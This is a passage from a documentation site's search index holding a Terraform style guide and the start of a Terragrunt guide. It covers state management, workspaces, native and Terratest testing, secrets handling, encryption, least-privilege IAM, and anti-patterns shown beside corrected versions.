\"arn:aws:kms:us-east-1:123456789012:key/12345678-1234-1234-1234-123456789012\"\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#state-management-best-practices","title":"State Management Best Practices","text":"<pre><code>## Use lifecycle meta-arguments for critical resources\nresource \"aws_db_instance\" \"production\" {\n  allocated_storage = 100\n  engine            = \"postgres\"\n  instance_class    = \"db.t3.large\"\n\n  lifecycle {\n    prevent_destroy = true\n    ignore_changes  = [password]\n  }\n}\n\n## Use terraform_remote_state for cross-stack references\ndata \"terraform_remote_state\" \"network\" {\n  backend = \"s3\"\n  config = {\n    bucket = \"my-terraform-state-bucket\"\n    key    = \"network/terraform.tfstate\"\n    region = \"us-east-1\"\n  }\n}\n\nresource \"aws_instance\" \"app\" {\n  subnet_id = data.terraform_remote_state.network.outputs.private_subnet_ids[0]\n  # ...\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#workspace-usage","title":"Workspace Usage","text":"<p>Use workspaces for environment separation (when not using separate state files):</p> <pre><code>## locals.tf - Workspace-aware configuration\nlocals {\n  workspace_config = {\n    dev = {\n      instance_type = \"t3.micro\"\n      instance_count = 1\n    }\n    staging = {\n      instance_type = \"t3.small\"\n      instance_count = 2\n    }\n    prod = {\n      instance_type = \"t3.large\"\n      instance_count = 4\n    }\n  }\n\n  environment = terraform.workspace\n  config      = local.workspace_config[terraform.workspace]\n}\n\n## main.tf - Use workspace configuration\nresource \"aws_instance\" \"app\" {\n  count         = local.config.instance_count\n  instance_type = local.config.instance_type\n  ami           = data.aws_ami.ubuntu.id\n\n  tags = {\n    Name        = \"${var.project}-${local.environment}-app-${count.index + 1}\"\n    Environment = local.environment\n  }\n}\n</code></pre> <p>Workspace commands:</p> <pre><code>## Create and switch to workspace\nterraform workspace new dev\nterraform workspace new staging\nterraform workspace new prod\n\n## List workspaces\nterraform workspace list\n\n## Switch workspace\nterraform workspace select prod\n\n## Show current workspace\nterraform workspace show\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#testing","title":"Testing","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#native-terraform-testing-terraform-16","title":"Native Terraform Testing (Terraform 1.6+)","text":"<p>Use Terraform's built-in testing framework:</p> <pre><code>## tests/vpc_validation.tftest.hcl\nvariables {\n  vpc_cidr_block = \"10.0.0.0/16\"\n  environment    = \"test\"\n  project        = \"myapp\"\n}\n\nrun \"validate_vpc_creation\" {\n  command = apply\n\n  assert {\n    condition     = aws_vpc.main.cidr_block == \"10.0.0.0/16\"\n    error_message = \"VPC CIDR block does not match expected value\"\n  }\n\n  assert {\n    condition     = aws_vpc.main.enable_dns_hostnames == true\n    error_message = \"DNS hostnames must be enabled\"\n  }\n}\n\nrun \"validate_subnet_count\" {\n  command = plan\n\n  assert {\n    condition     = length(aws_subnet.public) &gt;= 2\n    error_message = \"Must create at least 2 public subnets\"\n  }\n}\n</code></pre> <p>Run tests:</p> <pre><code>terraform test\nterraform test -verbose\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#terratest-go-based-testing","title":"Terratest (Go-based Testing)","text":"<pre><code>// tests/vpc_test.go\npackage test\n\nimport (\n    \"testing\"\n\n    \"github.com/gruntwork-io/terratest/modules/terraform\"\n    \"github.com/stretchr/testify/assert\"\n)\n\nfunc TestVPCModule(t *testing.T) {\n    t.Parallel()\n\n    terraformOptions := &amp;terraform.Options{\n        TerraformDir: \"../examples/basic\",\n        Vars: map[string]interface{}{\n            \"vpc_cidr_block\": \"10.0.0.0/16\",\n            \"environment\":    \"test\",\n            \"project\":        \"myapp\",\n        },\n    }\n\n    defer terraform.Destroy(t, terraformOptions)\n    terraform.InitAndApply(t, terraformOptions)\n\n    // Validate outputs\n    vpcID := terraform.Output(t, terraformOptions, \"vpc_id\")\n    assert.NotEmpty(t, vpcID)\n\n    subnetIDs := terraform.OutputList(t, terraformOptions, \"public_subnet_ids\")\n    assert.GreaterOrEqual(t, len(subnetIDs), 2)\n}\n</code></pre> <p>Run Terratest:</p> <pre><code>cd tests\ngo test -v -timeout 30m\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#security-best-practices","title":"Security Best Practices","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#secrets-management","title":"Secrets Management","text":"<p>NEVER hardcode secrets in Terraform code:</p> <pre><code>## Bad - Hardcoded secrets\nresource \"aws_db_instance\" \"bad\" {\n  password = \"SuperSecretPassword123!\"  # NEVER do this\n}\n\n## Good - Use variables with sensitive flag\nvariable \"database_password\" {\n  type        = string\n  description = \"Database master password\"\n  sensitive   = true\n}\n\nresource \"aws_db_instance\" \"good\" {\n  password = var.database_password\n}\n\n## Better - Generate secrets dynamically\nresource \"random_password\" \"db_password\" {\n  length  = 32\n  special = true\n}\n\nresource \"aws_secretsmanager_secret\" \"db_password\" {\n  name = \"${var.project}-${var.environment}-db-password\"\n}\n\nresource \"aws_secretsmanager_secret_version\" \"db_password\" {\n  secret_id     = aws_secretsmanager_secret.db_password.id\n  secret_string = random_password.db_password.result\n}\n\nresource \"aws_db_instance\" \"best\" {\n  password = random_password.db_password.result\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#encryption","title":"Encryption","text":"<p>Enable encryption for data at rest and in transit:</p> <pre><code>resource \"aws_s3_bucket\" \"data\" {\n  bucket = \"${var.project}-${var.environment}-data\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"data\" {\n  bucket = aws_s3_bucket.data.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm     = \"aws:kms\"\n      kms_master_key_id = aws_kms_key.s3.arn\n    }\n  }\n}\n\nresource \"aws_db_instance\" \"main\" {\n  storage_encrypted = true\n  kms_key_id        = aws_kms_key.rds.arn\n  # ...\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#iam-least-privilege","title":"IAM Least Privilege","text":"<pre><code>data \"aws_iam_policy_document\" \"app_policy\" {\n  statement {\n    sid    = \"AllowS3ReadWrite\"\n    effect = \"Allow\"\n    actions = [\n      \"s3:GetObject\",\n      \"s3:PutObject\",\n    ]\n    resources = [\n      \"${aws_s3_bucket.app_data.arn}/*\",\n    ]\n  }\n\n  statement {\n    sid    = \"AllowKMSDecrypt\"\n    effect = \"Allow\"\n    actions = [\n      \"kms:Decrypt\",\n      \"kms:DescribeKey\",\n    ]\n    resources = [\n      aws_kms_key.app.arn,\n    ]\n  }\n}\n\nresource \"aws_iam_policy\" \"app\" {\n  name   = \"${var.project}-${var.environment}-app-policy\"\n  policy = data.aws_iam_policy_document.app_policy.json\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#anti-patterns","title":"Anti-Patterns","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-hardcoded-values","title":"\u274c Avoid: Hardcoded Values","text":"<pre><code>## Bad\nresource \"aws_instance\" \"web\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"  # Hardcoded AMI\n  instance_type = \"t3.medium\"              # Hardcoded instance type\n  subnet_id     = \"subnet-12345678\"        # Hardcoded subnet ID\n}\n\n## Good\ndata \"aws_ami\" \"latest_ubuntu\" {\n  most_recent = true\n  owners      = [\"099720109477\"]\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*\"]\n  }\n}\n\nresource \"aws_instance\" \"web\" {\n  ami           = data.aws_ami.latest_ubuntu.id\n  instance_type = var.instance_type\n  subnet_id     = aws_subnet.public[0].id\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-count-with-complex-resources","title":"\u274c Avoid: Count with Complex Resources","text":"<pre><code>## Bad - Using count can cause recreation issues\nresource \"aws_instance\" \"web\" {\n  count         = 3\n  ami           = data.aws_ami.ubuntu.id\n  instance_type = var.instance_type\n}\n\n## Good - Use for_each for stability\nresource \"aws_instance\" \"web\" {\n  for_each      = toset([\"web-1\", \"web-2\", \"web-3\"])\n  ami           = data.aws_ami.ubuntu.id\n  instance_type = var.instance_type\n\n  tags = {\n    Name = \"${var.project}-${var.environment}-${each.key}\"\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-inline-policies","title":"\u274c Avoid: Inline Policies","text":"<pre><code>## Bad - Inline policy is harder to reuse and test\nresource \"aws_iam_role\" \"app\" {\n  name = \"app-role\"\n\n  inline_policy {\n    name = \"app-policy\"\n    policy = jsonencode({\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Action   = [\"s3:*\"]\n          Effect   = \"Allow\"\n          Resource = \"*\"\n        }\n      ]\n    })\n  }\n}\n\n## Good - Separate policy document and attachment\ndata \"aws_iam_policy_document\" \"app\" {\n  statement {\n    sid    = \"S3Access\"\n    effect = \"Allow\"\n    actions = [\n      \"s3:GetObject\",\n      \"s3:PutObject\",\n    ]\n    resources = [\"${aws_s3_bucket.app.arn}/*\"]\n  }\n}\n\nresource \"aws_iam_policy\" \"app\" {\n  name   = \"${var.project}-app-policy\"\n  policy = data.aws_iam_policy_document.app.json\n}\n\nresource \"aws_iam_role_policy_attachment\" \"app\" {\n  role       = aws_iam_role.app.name\n  policy_arn = aws_iam_policy.app.arn\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-not-using-remote-state","title":"\u274c Avoid: Not Using Remote State","text":"<pre><code>## Bad - Local state only (risky for teams)\n## No backend configuration - state stored locally\n\n## Good - Remote state with locking\nterraform {\n  backend \"s3\" {\n    bucket         = \"myapp-terraform-state\"\n    key            = \"prod/terraform.tfstate\"\n    region         = \"us-east-1\"\n    encrypt        = true\n    dynamodb_table = \"terraform-state-lock\"\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-missing-required-providers-version","title":"\u274c Avoid: Missing Required Providers Version","text":"<pre><code>## Bad - No version constraint\nterraform {\n  required_providers {\n    aws = {\n      source = \"hashicorp/aws\"\n      # No version specified - can break unexpectedly\n    }\n  }\n}\n\n## Good - Pin provider versions\nterraform {\n  required_version = \"&gt;= 1.6.0\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \"~&gt; 5.0\"  # Allow minor updates only\n    }\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-using-default-vpc-and-subnets","title":"\u274c Avoid: Using Default VPC and Subnets","text":"<pre><code>## Bad - Relying on default VPC\nresource \"aws_instance\" \"web\" {\n  ami           = data.aws_ami.ubuntu.id\n  instance_type = var.instance_type\n  # Implicitly uses default VPC - not reproducible\n}\n\n## Good - Explicitly create networking\nresource \"aws_vpc\" \"main\" {\n  cidr_block           = var.vpc_cidr\n  enable_dns_hostnames = true\n\n  tags = {\n    Name = \"${var.project}-${var.environment}-vpc\"\n  }\n}\n\nresource \"aws_subnet\" \"public\" {\n  vpc_id                  = aws_vpc.main.id\n  cidr_block              = var.public_subnet_cidr\n  map_public_ip_on_launch = true\n\n  tags = {\n    Name = \"${var.project}-${var.environment}-public\"\n  }\n}\n\nresource \"aws_instance\" \"web\" {\n  ami           = data.aws_ami.ubuntu.id\n  instance_type = var.instance_type\n  subnet_id     = aws_subnet.public.id\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-overly-permissive-security-groups","title":"\u274c Avoid: Overly Permissive Security Groups","text":"<pre><code>## Bad - Open to the world\nresource \"aws_security_group\" \"web\" {\n  name = \"web-sg\"\n\n  ingress {\n    from_port   = 0\n    to_port     = 65535\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]  # \u274c Everything open!\n  }\n}\n\n## Good - Specific rules with justification\nresource \"aws_security_group\" \"web\" {\n  name        = \"${var.project}-${var.environment}-web-sg\"\n  description = \"Security group for web servers\"\n  vpc_id      = aws_vpc.main.id\n\n  tags = {\n    Name = \"${var.project}-${var.environment}-web-sg\"\n  }\n}\n\nresource \"aws_security_group_rule\" \"web_https\" {\n  type              = \"ingress\"\n  description       = \"Allow HTTPS from CloudFront\"\n  from_port         = 443\n  to_port           = 443\n  protocol          = \"tcp\"\n  cidr_blocks       = var.cloudfront_cidr_blocks\n  security_group_id = aws_security_group.web.id\n}\n\nresource \"aws_security_group_rule\" \"web_egress\" {\n  type              = \"egress\"\n  description       = \"Allow outbound to specific services\"\n  from_port         = 443\n  to_port           = 443\n  protocol          = \"tcp\"\n  cidr_blocks       = var.service_endpoints\n  security_group_id = aws_security_group.web.id\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-not-using-data-sources-for-existing-resources","title":"\u274c Avoid: Not Using Data Sources for Existing Resources","text":"<pre><code>## Bad - Hardcoding existing resource IDs\nresource \"aws_route_table_association\" \"public\" {\n  subnet_id      = aws_subnet.public.id\n  route_table_id = \"rtb-12345678\"  # \u274c Hardcoded route table\n}\n\n## Good - Use data sources\ndata \"aws_route_table\" \"main\" {\n  vpc_id = aws_vpc.main.id\n\n  filter {\n    name   = \"tag:Name\"\n    values = [\"${var.project}-main-rt\"]\n  }\n}\n\nresource \"aws_route_table_association\" \"public\" {\n  subnet_id      = aws_subnet.public.id\n  route_table_id = data.aws_route_table.main.id\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-missing-lifecycle-rules","title":"\u274c Avoid: Missing Lifecycle Rules","text":"<pre><code>## Bad - Can accidentally destroy critical resources\nresource \"aws_db_instance\" \"production\" {\n  identifier        = \"prod-db\"\n  engine            = \"postgres\"\n  instance_class    = \"db.t3.medium\"\n  allocated_storage = 100\n  # No lifecycle protection - can be destroyed!\n}\n\n## Good - Protect critical resources\nresource \"aws_db_instance\" \"production\" {\n  identifier        = \"prod-db\"\n  engine            = \"postgres\"\n  instance_class    = \"db.t3.medium\"\n  allocated_storage = 100\n\n  lifecycle {\n    prevent_destroy = true  # \u2705 Prevent accidental deletion\n    ignore_changes  = [      # \u2705 Ignore password changes\n      password,\n    ]\n  }\n\n  tags = {\n    Name        = \"${var.project}-prod-db\"\n    Environment = \"production\"\n    Critical    = \"true\"\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#avoid-not-tagging-resources","title":"\u274c Avoid: Not Tagging Resources","text":"<pre><code>## Bad - No tags for cost tracking or management\nresource \"aws_instance\" \"web\" {\n  ami           = data.aws_ami.ubuntu.id\n  instance_type = var.instance_type\n  # No tags - can't track costs or manage resources\n}\n\n## Good - Comprehensive tagging strategy\nlocals {\n  common_tags = {\n    Project     = var.project\n    Environment = var.environment\n    ManagedBy   = \"terraform\"\n    CostCenter  = var.cost_center\n    Owner       = var.owner_email\n  }\n}\n\nresource \"aws_instance\" \"web\" {\n  ami           = data.aws_ami.ubuntu.id\n  instance_type = var.instance_type\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-web\"\n      Role = \"web-server\"\n    }\n  )\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#recommended-tools","title":"Recommended Tools","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#tflint-configuration","title":"tflint Configuration","text":"<pre><code>## .tflint.hcl\nplugin \"terraform\" {\n  enabled = true\n  preset  = \"recommended\"\n}\n\nplugin \"aws\" {\n  enabled = true\n  version = \"0.27.0\"\n  source  = \"github.com/terraform-linters/tflint-ruleset-aws\"\n}\n\nrule \"terraform_naming_convention\" {\n  enabled = true\n}\n\nrule \"terraform_required_version\" {\n  enabled = true\n}\n\nrule \"terraform_required_providers\" {\n  enabled = true\n}\n</code></pre> <p>Run tflint:</p> <pre><code>tflint --init\ntflint --recursive\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#terraform-docs-configuration","title":"terraform-docs Configuration","text":"<pre><code>## .terraform-docs.yml\nformatter: markdown table\n\nheader-from: main.tf\nfooter-from: \"\"\n\nsections:\n  show:\n    - header\n    - requirements\n    - providers\n    - inputs\n    - outputs\n    - resources\n\noutput:\n  file: README.md\n  mode: inject\n  template: |-\n    &lt;!-- BEGIN_TF_DOCS --&gt;\n    {{ .Content }}\n    &lt;!-- END_TF_DOCS --&gt;\n\nsort:\n  enabled: true\n  by: required\n</code></pre> <p>Generate documentation:</p> <pre><code>terraform-docs .\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#pre-commit-hook-configuration","title":"Pre-commit Hook Configuration","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.83.5\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n      - id: terraform_tflint\n        args:\n          - --args=--config=__GIT_WORKING_DIR__/.tflint.hcl\n      - id: terraform_docs\n        args:\n          - --hook-config=--path-to-file=README.md\n          - --hook-config=--add-to-existing-file=true\n          - --hook-config=--create-file-if-not-exist=true\n      - id: terraform_tfsec\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#complete-module-example","title":"Complete Module Example","text":"<pre><code>## modules/vpc-network/main.tf\n\"\"\"\n@module vpc-network\n@description Production-grade VPC module with public/private subnets and NAT gateway\n@dependencies aws &gt;= 5.0\n@version 1.2.0\n@author Tyler Dukes\n@last_updated 2025-10-28\n@terraform_version &gt;= 1.5.0, &lt; 2.0.0\n\"\"\"\n\n#----------------------------------------------------------------------\n## VPC\n#----------------------------------------------------------------------\nresource \"aws_vpc\" \"main\" {\n  cidr_block           = var.vpc_cidr_block\n  enable_dns_hostnames = true\n  enable_dns_support   = true\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-vpc\"\n    }\n  )\n}\n\n#----------------------------------------------------------------------\n## Public Subnets\n#----------------------------------------------------------------------\nresource \"aws_subnet\" \"public\" {\n  count                   = length(var.availability_zones)\n  vpc_id                  = aws_vpc.main.id\n  cidr_block              = cidrsubnet(var.vpc_cidr_block, 4, count.index)\n  availability_zone       = var.availability_zones[count.index]\n  map_public_ip_on_launch = true\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-public-${count.index + 1}\"\n      Type = \"public\"\n    }\n  )\n}\n\n#----------------------------------------------------------------------\n## Internet Gateway\n#----------------------------------------------------------------------\nresource \"aws_internet_gateway\" \"main\" {\n  vpc_id = aws_vpc.main.id\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-igw\"\n    }\n  )\n}\n\n#----------------------------------------------------------------------\n## Route Table for Public Subnets\n#----------------------------------------------------------------------\nresource \"aws_route_table\" \"public\" {\n  vpc_id = aws_vpc.main.id\n\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.main.id\n  }\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-public-rt\"\n    }\n  )\n}\n\nresource \"aws_route_table_association\" \"public\" {\n  count          = length(aws_subnet.public)\n  subnet_id      = aws_subnet.public[count.index].id\n  route_table_id = aws_route_table.public.id\n}\n</code></pre> <pre><code>## modules/vpc-network/variables.tf\nvariable \"project\" {\n  type        = string\n  description = \"Project name for resource naming\"\n}\n\nvariable \"environment\" {\n  type        = string\n  description = \"Environment name (dev, staging, prod)\"\n\n  validation {\n    condition     = contains([\"dev\", \"staging\", \"prod\"], var.environment)\n    error_message = \"Environment must be dev, staging, or prod.\"\n  }\n}\n\nvariable \"vpc_cidr_block\" {\n  type        = string\n  description = \"CIDR block for VPC\"\n\n  validation {\n    condition     = can(cidrhost(var.vpc_cidr_block, 0))\n    error_message = \"Must be a valid CIDR block.\"\n  }\n}\n\nvariable \"availability_zones\" {\n  type        = list(string)\n  description = \"List of availability zones\"\n}\n\nvariable \"common_tags\" {\n  type        = map(string)\n  description = \"Common tags to apply to all resources\"\n  default     = {}\n}\n</code></pre> <pre><code>## modules/vpc-network/outputs.tf\noutput \"vpc_id\" {\n  description = \"ID of the VPC\"\n  value       = aws_vpc.main.id\n}\n\noutput \"vpc_cidr_block\" {\n  description = \"CIDR block of the VPC\"\n  value       = aws_vpc.main.cidr_block\n}\n\noutput \"public_subnet_ids\" {\n  description = \"List of public subnet IDs\"\n  value       = aws_subnet.public[*].id\n}\n\noutput \"internet_gateway_id\" {\n  description = \"ID of the Internet Gateway\"\n  value       = aws_internet_gateway.main.id\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#see-also","title":"See Also","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#related-infrastructure-guides","title":"Related Infrastructure Guides","text":"<ul> <li>HCL Style Guide - HashiCorp Configuration Language fundamentals</li> <li>Terragrunt Guide - DRY Terraform configurations</li> <li>AWS CDK Guide - Alternative IaC with TypeScript/Python</li> <li>Kubernetes &amp; Helm Guide - Container orchestration IaC</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#configuration-management","title":"Configuration Management","text":"<ul> <li>Ansible Guide - Configuration management and provisioning</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#development-tools-practices","title":"Development Tools &amp; Practices","text":"<ul> <li>IDE Integration Guide - VS Code, IntelliJ Terraform plugins</li> <li>Pre-commit Hooks Guide - terraform fmt, validate, tflint</li> <li>Local Validation Setup - Terraform, tflint, checkov setup</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#testing-quality","title":"Testing &amp; Quality","text":"<ul> <li>Testing Strategies - Terratest, kitchen-terraform patterns</li> <li>Security Scanning Guide - checkov, tfsec, terrascan</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#cicd-integration","title":"CI/CD Integration","text":"<ul> <li>GitHub Actions Guide - Terraform workflow examples</li> <li>GitLab CI Guide - Terraform pipeline configuration</li> <li>AI Validation Pipeline - Automated IaC review</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#templates-examples","title":"Templates &amp; Examples","text":"<ul> <li>Terraform Module Template - Module structure</li> <li>Terraform Module Example - Complete module</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#core-documentation","title":"Core Documentation","text":"<ul> <li>Getting Started Guide - Repository setup</li> <li>Metadata Schema Reference - Frontmatter requirements</li> <li>Structure Guide - Terraform project organization</li> <li>Principles - Style guide philosophy</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#references","title":"References","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#official-documentation","title":"Official Documentation","text":"<ul> <li>Terraform Documentation</li> <li>Terraform Registry</li> <li>HCL Syntax</li> <li>Terraform Best Practices</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#aws-provider","title":"AWS Provider","text":"<ul> <li>AWS Provider Documentation</li> <li>AWS Well-Architected Framework</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#tools","title":"Tools","text":"<ul> <li>tflint - Terraform linter</li> <li>terraform-docs - Documentation generator</li> <li>Terratest - Go-based testing framework</li> <li>checkov - Security and compliance scanner</li> <li>tfsec - Security scanner</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#community-resources","title":"Community Resources","text":"<ul> <li>Terraform AWS Modules</li> <li>Gruntwork Infrastructure as Code Library</li> <li>Terraform Up &amp; Running (Book)</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terragrunt/","title":"Terragrunt Style Guide","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#language-overview","title":"Language Overview","text":"<p>Terragrunt is a thin wrapper for Terraform that provides extra tools for keeping your Terraform configurations DRY (Don't Repeat Yourself), working with multiple Terraform modules, and managing remote state. This guide covers Terragrunt best practices for multi-environment infrastructure.</p>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Purpose: DRY Terraform configurations, remote state management, multi-environment orchestration</li> <li>File Extension: <code>.hcl</code> (HCL syntax)</li> <li>Primary Use: Managing Terraform across multiple environments, regions, and accounts</li> <li>Version: Terragrunt 0.45.x+ (compatible with Terraform 1.5.x+)</li> </ul>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Files Root Config <code>terragrunt.hcl</code> <code>terragrunt.hcl</code> Root configuration file Environment Config <code>{env}/terragrunt.hcl</code> <code>prod/terragrunt.hcl</code> Per-environment config Module Config <code>{module}/terragrunt.hcl</code> <code>vpc/terragrunt.hcl</code> Per-module config Structure Directory Layout Environment-based <code>{env}/{region}/{module}</code> Hierarchical structure Root HCL Shared config DRY backend, provider config Reusable configuration Key Blocks <code>terraform</code> Terraform settings <code>source = \"../modules/vpc\"</code> Module source <code>include</code> Include parent config <code>include { path = find_in_parent_folders() }</code> Inherit settings <code>inputs</code> Module variables <code>inputs = { vpc_cidr = \"10.0.0.0/16\" }</code> Pass variables <code>remote_state</code> State configuration Backend settings S3, GCS, etc. <code>dependency</code> Module dependencies <code>dependency \"vpc\" { }</code> Inter-module deps Functions <code>find_in_parent_folders()</code> Find parent config Auto-locate root HCL Traverse up directories <code>get_terragrunt_dir()</code> Current directory Working directory path Current module path <code>path_relative_to_include()</code> Relative path Generate unique names Path-based naming Best Practices DRY Principle Use root HCL Shared backend, provider Avoid repetition Dependencies Explicit deps Use <code>dependency</code> blocks Clear relationships State Isolation Per-module state Separate state files Blast radius reduction Run All Use with caution <code>terragrunt run-all</code> Test in non-prod first","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#directory-structure","title":"Directory Structure","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#standard-layout","title":"Standard Layout","text":"<p>Use the <code>live/&lt;account&gt;/&lt;region&gt;/&lt;environment&gt;/&lt;stack&gt;</code> pattern:</p> <pre><code>infrastructure/\n\u251c\u2500\u2500 modules/                           # Reusable Terraform modules\n\u2502   \u251c\u2500\u2500 vpc/\n\u2502   \u251c\u2500\u2500 eks/\n\u2502   \u2514\u2500\u2500 rds/\n\u251c\u2500\u2500 live/                              # Live infrastructure\n\u2502   \u251c\u2500\u2500 terragrunt.hcl                # Root configuration\n\u2502   \u251c\u2500\u2500 prod/\n\u2502   \u2502   \u251c\u2500\u2500 us-east-1/\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 vpc/\n\u2502   \u2502   \u2502   \u2502   \u2514\u2500\u2500 terragrunt.hcl\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 eks/\n\u2502   \u2502   \u2502   \u2502   \u2514\u2500\u2500 terragrunt.hcl\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 rds/\n\u2502   \u2502   \u2502       \u2514\u2500\u2500 terragrunt.hcl\n\u2502   \u2502   \u2514\u2500\u2500 us-west-2/\n\u2502   \u2502       \u2514\u2500\u2500 vpc/\n\u2502   \u2502           \u2514\u2500\u2500 terragrunt.hcl\n\u2502   \u251c\u2500\u2500 staging/\n\u2502   \u2502   \u2514\u2500\u2500 us-east-1/\n\u2502   \u2502       \u251c\u2500\u2500 vpc/\n\u2502   \u2502       \u2502   \u2514\u2500\u2500 terragrunt.hcl\n\u2502   \u2502       \u2514\u2500\u2500 eks/\n\u2502   \u2502           \u2514\u2500\u2500 terragrunt.hcl\n\u2502   \u2514\u2500\u2500 dev/\n\u2502       \u2514\u2500\u2500 us-east-1/\n\u2502           \u2514\u2500\u2500 vpc/\n\u2502               \u2514\u2500\u2500 terragrunt.hcl\n\u2514\u2500\u2500 README.md\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#root-terragrunthcl","title":"Root terragrunt.hcl","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#centralized-configuration","title":"Centralized Configuration","text":"<pre><code>## @module 